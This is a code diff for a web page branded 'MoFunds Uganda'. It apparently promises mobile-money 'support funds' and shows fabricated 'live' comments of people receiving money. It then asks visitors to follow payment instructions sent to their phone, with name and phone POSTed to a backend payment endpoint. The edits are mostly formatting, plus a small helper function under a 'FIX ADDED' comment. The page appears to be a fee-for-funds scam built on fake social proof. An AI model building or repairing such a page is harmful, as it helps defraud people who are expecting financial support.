@@ -117,13 +117,7 @@ background:rgba(255,255,255,.9);
 border:1px solid rgba(0,0,0,.08);
 overflow:hidden;
 }
-.live-comments h3{
-text-align:center;
-font-size:17px;
-margin-bottom:15px;
-position:relative;
-z-index:2;
-}
+.live-comments h3{text-align:center;font-size:17px;margin-bottom:15px;position:relative;z-index:2;}
 .live-comment{
 display:flex;
 align-items:center;
@@ -209,9 +203,7 @@ animation:flowerFall linear forwards;
 
 <div id="stkMessage"></div>
 
-<p class="small">
-📲 Follow the payment instructions on the phone number entered above.
-</p>
+<p class="small">📲 Follow the payment instructions on the phone number entered above.</p>
 
 <div class="live-comments">
 <h3>🎉 PEOPLE RECEIVING MOMO FUNDS UGANDA SUPPORT RIGHT NOW</h3>
@@ -235,6 +227,7 @@ animation:flowerFall linear forwards;
 <small id="liveTime2">12s ago</small>
 </div>
 </div>
+
 </div>
 
 <div class="footer">© 2026 MoFunds Uganda</div>
@@ -294,6 +287,11 @@ msg.textContent=text;
 msg.className=type;
 }
 
+/* FIX ADDED - keeps everything else unchanged */
+function setStatus(text,type=""){
+setMessage(text,type);
+}
+
 function setLoading(state,text){
 payBtn.disabled=state;
 payBtn.textContent=state?text:"💳 Continue Payment";
@@ -337,9 +335,7 @@ try{
 
 const response=await fetch(`${BACKEND_URL}/api/pay`,{
 method:"POST",
-headers:{
-"Content-Type":"application/json"
-},
+headers:{"Content-Type":"application/json"},
 body:JSON.stringify({
 name: applicant,
 phone: phone,
